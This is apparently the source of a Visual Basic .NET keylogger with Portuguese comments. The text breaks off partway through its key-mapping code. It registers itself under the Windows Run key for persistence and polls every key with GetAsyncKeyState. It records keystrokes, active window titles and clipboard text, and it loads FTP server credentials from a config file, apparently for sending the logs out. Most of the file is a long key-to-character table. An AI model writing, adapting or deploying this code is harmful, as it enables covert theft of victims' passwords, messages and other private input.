Imports System.Net.Mail 'Email Class
Imports Microsoft.VisualBasic.Devices.Keyboard
Imports System
Imports System.IO
Imports System.Security
Imports System.Security.Permissions
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Net
Imports System.Text
Imports System.Management
Imports Microsoft.VisualBasic
Imports System.Runtime.InteropServices
Imports System.Object
Imports System.Drawing
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.Interaction
Imports System.Data
Imports System.Data.SqlClient
Imports System.Collections.Generic
Imports System.Collections
Imports System.Security.Principal
Imports System.Diagnostics
Imports System.Threading
Imports System.Text.RegularExpressions
Imports System.Xml
Imports Microsoft.Win32
Imports System.IO.Compression
Imports System.Configuration
Imports System.Drawing.Imaging
Imports System.Drawing.Drawing2D
Imports System.Security.Cryptography
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Diagnostics.Process



Public Class form1
    ' -----criando um valor no registro--------
    Public Shared Sub AddStartup(ByVal Name As String, ByVal Path As String)
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)

    End Sub
    Dim usuarioftp As String
    Dim senhaftp As String
    Dim servidor As String
    Dim pasta As String
    Dim intervalo
    Public Sub lerxml()
        'Try


        'Cria uma instância de um documento XML
        Dim oXML As New XmlDocument

        'Define o caminho do arquivo XML 
        Dim ArquivoXML As String = "config.xml"
        'carrega o arquivo XML
        oXML.Load(ArquivoXML)

        'Lê o filho de um Nó Pai específico 
        servidor = oXML.SelectSingleNode("config").ChildNodes(0).InnerText
        pasta = oXML.SelectSingleNode("config").ChildNodes(1).InnerText
        usuarioftp = oXML.SelectSingleNode("config").ChildNodes(2).InnerText
        senhaftp = oXML.SelectSingleNode("config").ChildNodes(3).InnerText
        intervalo = Convert.ToInt64(oXML.SelectSingleNode("config").ChildNodes(4).InnerText)
        'Catch ex As Exception

        'End Try
    End Sub


    Private Sub Form(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        lerxml()
        AddStartup(Me.Text, Application.ExecutablePath)
    End Sub
    Dim result As Integer
    Dim hora As String
    Private Declare Function GetKeyState Lib "USER32" (ByVal vKey As Long) As Integer
    Private Declare Function GetAsyncKeyState Lib "USER32" (ByVal nVirtKey As Int32) As Integer

    '-------------------------------------------------------------configuração para captura da janela tiva -------------------------------------------------------------------
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Dim strin As String = Nothing

    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = DateTime.Now.ToShortTimeString() + MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function

    Private Sub Timer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick

        If strin <> GetActiveWindowTitle() Then
            TextBox1.Text = TextBox1.Text + vbNewLine + vbNewLine + "" + GetActiveWindowTitle() + "" + vbNewLine + Clipboard.GetText.ToString '(se preferir use para capturar tudo que foi selecionado)

            strin = GetActiveWindowTitle()
        End If

    End Sub

    'Private Sub K_Down(ByVal Key As String) Handles K.Down

    'End Sub
    '-------------------------------------------------------------configuração para captura da janela tiva fim ---------------------------------------------------------------

    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs) Handles Me.FormClosed
        TextBox1.Text &= vbNewLine & "Aplicativo parou em: " & Now & vbNewLine
    End Sub

    Private Sub Form1_HandleDestroyed(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.HandleDestroyed

    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Timer1.Start()
        Timer2.Start()
        Timer3.Start()

    End Sub
    Public Function GetCapslock() As Boolean
        ' Retornar ou definir o Caps alternância de bloqueio.

        GetCapslock = CBool(GetAsyncKeyState(&H14) And 1) 'GetKeyState

    End Function

    Public Function GetShift() As Boolean

        ' Retornar ou definir o Caps alternância de bloqueio.

        GetShift = CBool(GetAsyncKeyState(&H10))

    End Function



    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick

        For n As Integer = 1 To 225
            result = 0
            result = GetAsyncKeyState(n)
            If result = -32767 Then

                'opção---#1
                If GetCapslock() = True And GetShift() = True Then
                    Select Case (n)
                        Case 27
                            TextBox1.Text = TextBox1.Text + "[Esc]"
                            'Case 32
                            'TextBox1.Text = TextBox1.Text + "[SpaceBar]"

                            '+------A até Z-------+



                        Case 37
                            TextBox1.Text = TextBox1.Text + "[Left Arrow]"

                        Case 38
                            TextBox1.Text = TextBox1.Text + "[Up Arrow]"
                        Case 39
                            TextBox1.Text = TextBox1.Text + "[Right Arrow]"
                        Case 40
                            TextBox1.Text = TextBox1.Text + "[Down Arrow]"

                        Case 65
                            TextBox1.Text = TextBox1.Text + "a"
                        Case 66
                            TextBox1.Text = TextBox1.Text + "b"
                        Case 67
                            TextBox1.Text = TextBox1.Text + "c"
                        Case 68
                            TextBox1.Text = TextBox1.Text + "d"
                        Case 69
                            TextBox1.Text = TextBox1.Text + "e"
                        Case 70
                            TextBox1.Text = TextBox1.Text + "f"
                        Case 71
                            TextBox1.Text = TextBox1.Text + "g"
                        Case 72
                            TextBox1.Text = TextBox1.Text + "h"
                        Case 73
                            TextBox1.Text = TextBox1.Text + "i"
                        Case 74
                            TextBox1.Text = TextBox1.Text + "j"
                        Case 75
                            TextBox1.Text = TextBox1.Text + "k"
                        Case 76
                            TextBox1.Text = TextBox1.Text + "l"
                        Case 77
                            TextBox1.Text = TextBox1.Text + "m"
                        Case 78
                            TextBox1.Text = TextBox1.Text + "n"
                        Case 79
                            TextBox1.Text = TextBox1.Text + "o"
                        Case 80
                            TextBox1.Text = TextBox1.Text + "p"
                        Case 81
                            TextBox1.Text = TextBox1.Text + "q"
                        Case 82
                            TextBox1.Text = TextBox1.Text + "r"
                        Case 83
                            TextBox1.Text = TextBox1.Text + "s"
                        Case 84
                            TextBox1.Text = TextBox1.Text + "t"
                        Case 85
                            TextBox1.Text = TextBox1.Text + "u"
                        Case 86
                            TextBox1.Text = TextBox1.Text + "v"
                        Case 87
                            TextBox1.Text = TextBox1.Text + "w"
                        Case 88
                            TextBox1.Text = TextBox1.Text + "x"
                        Case 89
                            TextBox1.Text = TextBox1.Text + "y"
                        Case 90
                            TextBox1.Text = TextBox1.Text + "z"



                        Case 36
                            TextBox1.Text = TextBox1.Text + "[Home]"
                        Case 33
                            TextBox1.Text = TextBox1.Text + "[PageUP]"
                        Case 34
                            TextBox1.Text = TextBox1.Text + "[Page Down]"
                        Case 35
                            TextBox1.Text = TextBox1.Text + "[End]"
                        Case 45
                            TextBox1.Text = TextBox1.Text + "[Insert]"
                        Case 19
                            TextBox1.Text = TextBox1.Text + "[Pause Break]"
                        Case 44
                            TextBox1.Text = TextBox1.Text + "[PrtSc SysRq]"

                        Case 112
                            TextBox1.Text = TextBox1.Text + "[F1]"
                        Case 113
                            TextBox1.Text = TextBox1.Text + "[F2]"
                        Case 114
                            TextBox1.Text = TextBox1.Text + "[F3]"
                        Case 115
                            TextBox1.Text = TextBox1.Text + "[F4]"
                        Case 116
                            TextBox1.Text = TextBox1.Text + "[F5]"
                        Case 117
                            TextBox1.Text = TextBox1.Text + "[F6]"
                        Case 118
                            TextBox1.Text = TextBox1.Text + "[F7]"
                        Case 119
                            TextBox1.Text = TextBox1.Text + "[F8]"
                        Case 120
                            TextBox1.Text = TextBox1.Text + "[F9]"
                        Case 121
                            TextBox1.Text = TextBox1.Text + "[F10]"
                        Case 122
                            TextBox1.Text = TextBox1.Text + "[F11]"
                        Case 123
                            TextBox1.Text = TextBox1.Text + "[F12]"


                        Case 192
                            TextBox1.Text = TextBox1.Text + "~"
                        Case 1
                            'TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48
                            TextBox1.Text = TextBox1.Text + ")"
                        Case 49
                            TextBox1.Text = TextBox1.Text + "!"
                        Case 50
                            TextBox1.Text = TextBox1.Text + "@"
                        Case 51
                            TextBox1.Text = TextBox1.Text + "#"
                        Case 52
                            TextBox1.Text = TextBox1.Text + "$"
                        Case 53
                            TextBox1.Text = TextBox1.Text + "%"
                        Case 54
                            TextBox1.Text = TextBox1.Text + "^"
                        Case 55
                            TextBox1.Text = TextBox1.Text + "&"
                        Case 56
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 57
                            TextBox1.Text = TextBox1.Text + "("
                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + ">"
                        Case 16
                        Case 160 To 165
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "_"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 219
                            TextBox1.Text = TextBox1.Text + "{"
                        Case 221
                            TextBox1.Text = TextBox1.Text + "}"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ":"
                        Case 222
                            TextBox1.Text = TextBox1.Text + """"
                        Case 188
                            TextBox1.Text = TextBox1.Text + "<"
                        Case 191
                            TextBox1.Text = TextBox1.Text + "?"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "|"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 20
                        Case 91 'windows key
                        Case 9
                            TextBox1.Text = TextBox1.Text + " [Tab]"
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [RightMouseClick]"
                        Case 37 To 40

                            'TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
                        Case 96
                            TextBox1.Text = TextBox1.Text + "0"
                        Case 97 'letra a  

                            TextBox1.Text = TextBox1.Text + "1"
                        Case 98
                            TextBox1.Text = TextBox1.Text + "2"
                        Case 99
                            TextBox1.Text = TextBox1.Text + "3"
                        Case 100
                            TextBox1.Text = TextBox1.Text + "4"
                        Case 101
                            TextBox1.Text = TextBox1.Text + "5"
                        Case 102
                            TextBox1.Text = TextBox1.Text + "6"
                        Case 103
                            TextBox1.Text = TextBox1.Text + "7"
                        Case 104
                            TextBox1.Text = TextBox1.Text + "8"
                        Case 105
                            TextBox1.Text = TextBox1.Text + "9"
                        Case 106
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 107
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 109
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 110
                            TextBox1.Text = TextBox1.Text + "."
                        Case 111
                            TextBox1.Text = TextBox1.Text + "/"
                    End Select
                End If
                'opção--#2

                If GetCapslock() = True And GetShift() = False Then
                    Select Case (n)

                        Case 27
                            TextBox1.Text = TextBox1.Text + "[Esc]"
                            'Case 32
                            'TextBox1.Text = TextBox1.Text + "[SpaceBar]"
                            '+------A TO Z-------+

                            ' só faça alterações se souber o que está fazendo caso contrário haverá erros.






                        Case 37
                            TextBox1.Text = TextBox1.Text + "[Left Arrow]"

                        Case 38
                            TextBox1.Text = TextBox1.Text + "[Up Arrow]"
                        Case 39
                            TextBox1.Text = TextBox1.Text + "[Right Arrow]"
                        Case 40
                            TextBox1.Text = TextBox1.Text + "[Down Arrow]"


                        Case 65
                            TextBox1.Text = TextBox1.Text + "A"
                        Case 66
                            TextBox1.Text = TextBox1.Text + "B"
                        Case 67
                            TextBox1.Text = TextBox1.Text + "C"
                        Case 68
                            TextBox1.Text = TextBox1.Text + "D"
                        Case 69
                            TextBox1.Text = TextBox1.Text + "E"
                        Case 70
                            TextBox1.Text = TextBox1.Text + "F"
                        Case 71
                            TextBox1.Text = TextBox1.Text + "G"
                        Case 72
                            TextBox1.Text = TextBox1.Text + "H"
                        Case 73
                            TextBox1.Text = TextBox1.Text + "I"
                        Case 74
                            TextBox1.Text = TextBox1.Text + "J"
                        Case 75
                            TextBox1.Text = TextBox1.Text + "K"
                        Case 76
                            TextBox1.Text = TextBox1.Text + "L"
                        Case 77
                            TextBox1.Text = TextBox1.Text + "M"
                        Case 78
                            TextBox1.Text = TextBox1.Text + "N"
                        Case 79
                            TextBox1.Text = TextBox1.Text + "O"
                        Case 80
                            TextBox1.Text = TextBox1.Text + "P"
                        Case 81
                            TextBox1.Text = TextBox1.Text + "Q"
                        Case 82
                            TextBox1.Text = TextBox1.Text + "R"
                        Case 83
                            TextBox1.Text = TextBox1.Text + "S"
                        Case 84
                            TextBox1.Text = TextBox1.Text + "T"
                        Case 85
                            TextBox1.Text = TextBox1.Text + "U"
                        Case 86
                            TextBox1.Text = TextBox1.Text + "V"
                        Case 87
                            TextBox1.Text = TextBox1.Text + "W"
                        Case 88
                            TextBox1.Text = TextBox1.Text + "X"
                        Case 89
                            TextBox1.Text = TextBox1.Text + "Y"
                        Case 90
                            TextBox1.Text = TextBox1.Text + "Z"



                        Case 36
                            TextBox1.Text = TextBox1.Text + "[Home]"
                        Case 33
                            TextBox1.Text = TextBox1.Text + "[PageUP]"
                        Case 34
                            TextBox1.Text = TextBox1.Text + "[Page Down]"
                        Case 35
                            TextBox1.Text = TextBox1.Text + "[End]"
                        Case 45
                            TextBox1.Text = TextBox1.Text + "[Insert]"
                        Case 19
                            TextBox1.Text = TextBox1.Text + "[Pause Break]"
                        Case 44
                            TextBox1.Text = TextBox1.Text + "[PrtSc SysRq]"

                        Case 112
                            TextBox1.Text = TextBox1.Text + "[F1]"
                        Case 113
                            TextBox1.Text = TextBox1.Text + "[F2]"
                        Case 114
                            TextBox1.Text = TextBox1.Text + "[F3]"
                        Case 115
                            TextBox1.Text = TextBox1.Text + "[F4]"
                        Case 116
                            TextBox1.Text = TextBox1.Text + "[F5]"
                        Case 117
                            TextBox1.Text = TextBox1.Text + "[F6]"
                        Case 118
                            TextBox1.Text = TextBox1.Text + "[F7]"
                        Case 119
                            TextBox1.Text = TextBox1.Text + "[F8]"
                        Case 120
                            TextBox1.Text = TextBox1.Text + "[F9]"
                        Case 121
                            TextBox1.Text = TextBox1.Text + "[F10]"
                        Case 122
                            TextBox1.Text = TextBox1.Text + "[F11]"
                        Case 123
                            TextBox1.Text = TextBox1.Text + "[F12]"



                        Case 91 'windows key
                        Case 1
                            'TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"

                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + "."
                        Case 16
                        Case 160 To 165
                        Case 20
                        Case 192
                            TextBox1.Text = TextBox1.Text + "`"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "="

                        Case 219
                            TextBox1.Text = TextBox1.Text + "["
                        Case 221
                            TextBox1.Text = TextBox1.Text + "]"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ";"
                        Case 222
                            TextBox1.Text = TextBox1.Text + "'"
                        Case 188
                            TextBox1.Text = TextBox1.Text + ","
                        Case 191
                            TextBox1.Text = TextBox1.Text + "/"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "\"
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 9
                            TextBox1.Text = TextBox1.Text + " [Tab]"
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [RightMouseClick]"
                        Case 37 To 40

                            'TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
                        Case 96
                            TextBox1.Text = TextBox1.Text + "0"
                        Case 97 'letra  a  

                            TextBox1.Text = TextBox1.Text + "1"
                        Case 98
                            TextBox1.Text = TextBox1.Text + "2"
                        Case 99
                            TextBox1.Text = TextBox1.Text + "3"
                        Case 100
                            TextBox1.Text = TextBox1.Text + "4"
                        Case 101
                            TextBox1.Text = TextBox1.Text + "5"
                        Case 102
                            TextBox1.Text = TextBox1.Text + "6"
                        Case 103
                            TextBox1.Text = TextBox1.Text + "7"
                        Case 104
                            TextBox1.Text = TextBox1.Text + "8"
                        Case 105
                            TextBox1.Text = TextBox1.Text + "9"
                        Case 106
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 107
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 109
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 110
                            TextBox1.Text = TextBox1.Text + "."
                        Case 111
                            TextBox1.Text = TextBox1.Text + "/"
                    End Select
                End If

                'opção--#3

                If GetCapslock() = False And GetShift() = True Then
                    Select Case (n)
                        Case 27
                            TextBox1.Text = TextBox1.Text + "[Esc]"
                            'Case 32
                            'TextBox1.Text = TextBox1.Text + "[SpaceBar]"
                            '+------A até Z-------+



                        Case 37
                            TextBox1.Text = TextBox1.Text + "[Left Arrow]"

                        Case 38
                            TextBox1.Text = TextBox1.Text + "[Up Arrow]"
                        Case 39
                            TextBox1.Text = TextBox1.Text + "[Right Arrow]"
                        Case 40
                            TextBox1.Text = TextBox1.Text + "[Down Arrow]"



                        Case 65
                            TextBox1.Text = TextBox1.Text + "A"
                        Case 66
                            TextBox1.Text = TextBox1.Text + "B"
                        Case 67
                            TextBox1.Text = TextBox1.Text + "C"
                        Case 68
                            TextBox1.Text = TextBox1.Text + "D"
                        Case 69
                            TextBox1.Text = TextBox1.Text + "E"
                        Case 70
                            TextBox1.Text = TextBox1.Text + "F"
                        Case 71
                            TextBox1.Text = TextBox1.Text + "G"
                        Case 72
                            TextBox1.Text = TextBox1.Text + "H"
                        Case 73
                            TextBox1.Text = TextBox1.Text + "I"
                        Case 74
                            TextBox1.Text = TextBox1.Text + "J"
                        Case 75
                            TextBox1.Text = TextBox1.Text + "K"
                        Case 76
                            TextBox1.Text = TextBox1.Text + "L"
                        Case 77
                            TextBox1.Text = TextBox1.Text + "M"
                        Case 78
                            TextBox1.Text = TextBox1.Text + "N"
                        Case 79
                            TextBox1.Text = TextBox1.Text + "O"
                        Case 80
                            TextBox1.Text = TextBox1.Text + "P"
                        Case 81
                            TextBox1.Text = TextBox1.Text + "Q"
                        Case 82
                            TextBox1.Text = TextBox1.Text + "R"
                        Case 83
                            TextBox1.Text = TextBox1.Text + "S"
                        Case 84
                            TextBox1.Text = TextBox1.Text + "T"
                        Case 85
                            TextBox1.Text = TextBox1.Text + "U"
                        Case 86
                            TextBox1.Text = TextBox1.Text + "V"
                        Case 87
                            TextBox1.Text = TextBox1.Text + "W"
                        Case 88
                            TextBox1.Text = TextBox1.Text + "X"
                        Case 89
                            TextBox1.Text = TextBox1.Text + "Y"
                        Case 90
                            TextBox1.Text = TextBox1.Text + "Z"


                        Case 36
                            TextBox1.Text = TextBox1.Text + "[Home]"
                        Case 33
                            TextBox1.Text = TextBox1.Text + "[PageUP]"
                        Case 34
                            TextBox1.Text = TextBox1.Text + "[Page Down]"
                        Case 35
                            TextBox1.Text = TextBox1.Text + "[End]"
                        Case 45
                            TextBox1.Text = TextBox1.Text + "[Insert]"
                        Case 19
                            TextBox1.Text = TextBox1.Text + "[Pause Break]"
                        Case 44
                            TextBox1.Text = TextBox1.Text + "[PrtSc SysRq]"
                        Case 112
                            TextBox1.Text = TextBox1.Text + "[F1]"
                        Case 113
                            TextBox1.Text = TextBox1.Text + "[F2]"
                        Case 114
                            TextBox1.Text = TextBox1.Text + "[F3]"
                        Case 115
                            TextBox1.Text = TextBox1.Text + "[F4]"
                        Case 116
                            TextBox1.Text = TextBox1.Text + "[F5]"
                        Case 117
                            TextBox1.Text = TextBox1.Text + "[F6]"
                        Case 118
                            TextBox1.Text = TextBox1.Text + "[F7]"
                        Case 119
                            TextBox1.Text = TextBox1.Text + "[F8]"
                        Case 120
                            TextBox1.Text = TextBox1.Text + "[F9]"
                        Case 121
                            TextBox1.Text = TextBox1.Text + "[F10]"
                        Case 122
                            TextBox1.Text = TextBox1.Text + "[F11]"
                        Case 123
                            TextBox1.Text = TextBox1.Text + "[F12]"


                        Case 91 'windows key
                        Case 192
                            TextBox1.Text = TextBox1.Text + "~"
                        Case 1
                            ' TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                            ' caracteres especiais e teclas de função
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48
                            TextBox1.Text = TextBox1.Text + ")"
                        Case 49
                            TextBox1.Text = TextBox1.Text + "!"
                        Case 50
                            TextBox1.Text = TextBox1.Text + "@"
                        Case 51
                            TextBox1.Text = TextBox1.Text + "#"
                        Case 52
                            TextBox1.Text = TextBox1.Text + "$"
                        Case 53
                            TextBox1.Text = TextBox1.Text + "%"
                        Case 54
                            TextBox1.Text = TextBox1.Text + "^"
                        Case 55
                            TextBox1.Text = TextBox1.Text + "&"
                        Case 56
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 57
                            TextBox1.Text = TextBox1.Text + "("
                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + ">"
                        Case 16
                        Case 160 To 165
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "_"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 219
                            TextBox1.Text = TextBox1.Text + "{"
                        Case 221
                            TextBox1.Text = TextBox1.Text + "}"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ":"
                        Case 222
                            TextBox1.Text = TextBox1.Text + """"
                        Case 188
                            TextBox1.Text = TextBox1.Text + "<"
                        Case 191
                            TextBox1.Text = TextBox1.Text + "?"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "|"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 9
                            TextBox1.Text = TextBox1.Text + " [Tab]"
                        Case 20
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [RightMouseClick]"
                        Case 37 To 40
                            ' númericos e especiais
                        Case 96
                            TextBox1.Text = TextBox1.Text + "0"
                        Case 97 'letra a  

                            TextBox1.Text = TextBox1.Text + "1"
                        Case 98
                            TextBox1.Text = TextBox1.Text + "2"
                        Case 99
                            TextBox1.Text = TextBox1.Text + "3"
                        Case 100
                            TextBox1.Text = TextBox1.Text + "4"
                        Case 101
                            TextBox1.Text = TextBox1.Text + "5"
                        Case 102
                            TextBox1.Text = TextBox1.Text + "6"
                        Case 103
                            TextBox1.Text = TextBox1.Text + "7"
                        Case 104
                            TextBox1.Text = TextBox1.Text + "8"
                        Case 105
                            TextBox1.Text = TextBox1.Text + "9"
                        Case 106
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 107
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 109
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 110
                            TextBox1.Text = TextBox1.Text + "."
                        Case 111
                            TextBox1.Text = TextBox1.Text + "/"
                            'TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
                    End Select
                End If

                'opção--#4

                If GetCapslock() = False And GetShift() = False Then
                    Select Case (n)
                        Case 1
                        Case 27
                            TextBox1.Text = TextBox1.Text + "[Esc]"
                            'Case 32
                            'TextBox1.Text = TextBox1.Text + "[SpaceBar]"

                            ' TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"

                            ' não faça mudanças a menos que saiba o que está fazendo.

                            '=====================

                            '+------A até Z-------+



                        Case 37
                            TextBox1.Text = TextBox1.Text + "[Left Arrow]"

                        Case 38
                            TextBox1.Text = TextBox1.Text + "[Up Arrow]"
                        Case 39
                            TextBox1.Text = TextBox1.Text + "[Right Arrow]"
                        Case 40
                            TextBox1.Text = TextBox1.Text + "[Down Arrow]"


                        Case 65
                            TextBox1.Text = TextBox1.Text + "a"
                        Case 66
                            TextBox1.Text = TextBox1.Text + "b"
                        Case 67
                            TextBox1.Text = TextBox1.Text + "c"
                        Case 68
                            TextBox1.Text = TextBox1.Text + "d"
                        Case 69
                            TextBox1.Text = TextBox1.Text + "e"
                        Case 70
                            TextBox1.Text = TextBox1.Text + "f"
                        Case 71
                            TextBox1.Text = TextBox1.Text + "g"
                        Case 72
                            TextBox1.Text = TextBox1.Text + "h"
                        Case 73
                            TextBox1.Text = TextBox1.Text + "i"
                        Case 74
                            TextBox1.Text = TextBox1.Text + "j"
                        Case 75
                            TextBox1.Text = TextBox1.Text + "k"
                        Case 76
                            TextBox1.Text = TextBox1.Text + "l"
                        Case 77
                            TextBox1.Text = TextBox1.Text + "m"
                        Case 78
                            TextBox1.Text = TextBox1.Text + "n"
                        Case 79
                            TextBox1.Text = TextBox1.Text + "o"
                        Case 80
                            TextBox1.Text = TextBox1.Text + "p"
                        Case 81
                            TextBox1.Text = TextBox1.Text + "q"
                        Case 82
                            TextBox1.Text = TextBox1.Text + "r"
                        Case 83
                            TextBox1.Text = TextBox1.Text + "s"
                        Case 84
                            TextBox1.Text = TextBox1.Text + "t"
                        Case 85
                            TextBox1.Text = TextBox1.Text + "u"
                        Case 86
                            TextBox1.Text = TextBox1.Text + "v"
                        Case 87
                            TextBox1.Text = TextBox1.Text + "w"
                        Case 88
                            TextBox1.Text = TextBox1.Text + "x"
                        Case 89
                            TextBox1.Text = TextBox1.Text + "y"
                        Case 90
                            TextBox1.Text = TextBox1.Text + "z"

                            ' teclas de funções

                        Case 36
                            TextBox1.Text = TextBox1.Text + "[Home]"
                        Case 33
                            TextBox1.Text = TextBox1.Text + "[PageUP]"
                        Case 34
                            TextBox1.Text = TextBox1.Text + "[Page Down]"
                        Case 35
                            TextBox1.Text = TextBox1.Text + "[End]"
                        Case 45
                            TextBox1.Text = TextBox1.Text + "[Insert]"
                        Case 19
                            TextBox1.Text = TextBox1.Text + "[Pause Break]"
                        Case 44
                            TextBox1.Text = TextBox1.Text + "[PrtSc SysRq]"
                        Case 112
                            TextBox1.Text = TextBox1.Text + "[F1]"
                        Case 113
                            TextBox1.Text = TextBox1.Text + "[F2]"
                        Case 114
                            TextBox1.Text = TextBox1.Text + "[F3]"
                        Case 115
                            TextBox1.Text = TextBox1.Text + "[F4]"
                        Case 116
                            TextBox1.Text = TextBox1.Text + "[F5]"
                        Case 117
                            TextBox1.Text = TextBox1.Text + "[F6]"
                        Case 118
                            TextBox1.Text = TextBox1.Text + "[F7]"
                        Case 119
                            TextBox1.Text = TextBox1.Text + "[F8]"
                        Case 120
                            TextBox1.Text = TextBox1.Text + "[F9]"
                        Case 121
                            TextBox1.Text = TextBox1.Text + "[F10]"
                        Case 122
                            TextBox1.Text = TextBox1.Text + "[F11]"
                        Case 123
                            TextBox1.Text = TextBox1.Text + "[F12]"





                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48 To 57
                            TextBox1.Text = TextBox1.Text + Chr(n)
                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + "."
                        Case 16
                        Case 160 To 165
                        Case 20
                        Case 192
                            TextBox1.Text = TextBox1.Text + "`"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "="
                        Case 91 'windows key
                        Case 219
                            TextBox1.Text = TextBox1.Text + "["
                        Case 221
                            TextBox1.Text = TextBox1.Text + "]"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ";"
                        Case 222
                            TextBox1.Text = TextBox1.Text + "'"
                        Case 188
                            TextBox1.Text = TextBox1.Text + ","
                        Case 191
                            TextBox1.Text = TextBox1.Text + "/"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "\"
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 9
                            TextBox1.Text = TextBox1.Text + " [Tab]"
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [RightMouseClick]"
                        Case 37 To 40

                        Case 96
                            TextBox1.Text = TextBox1.Text + "0"
                        Case 97 'letra a  

                            TextBox1.Text = TextBox1.Text + "1"
                        Case 98
                            TextBox1.Text = TextBox1.Text + "2"
                        Case 99
                            TextBox1.Text = TextBox1.Text + "3"
                        Case 100
                            TextBox1.Text = TextBox1.Text + "4"
                        Case 101
                            TextBox1.Text = TextBox1.Text + "5"
                        Case 102
                            TextBox1.Text = TextBox1.Text + "6"
                        Case 103
                            TextBox1.Text = TextBox1.Text + "7"
                        Case 104
                            TextBox1.Text = TextBox1.Text + "8"
                        Case 105
                            TextBox1.Text = TextBox1.Text + "9"
                        Case 106
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 107
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 109
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 110
                            TextBox1.Text = TextBox1.Text + "."
                        Case 111
                            TextBox1.Text = TextBox1.Text + "/"
                            'TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
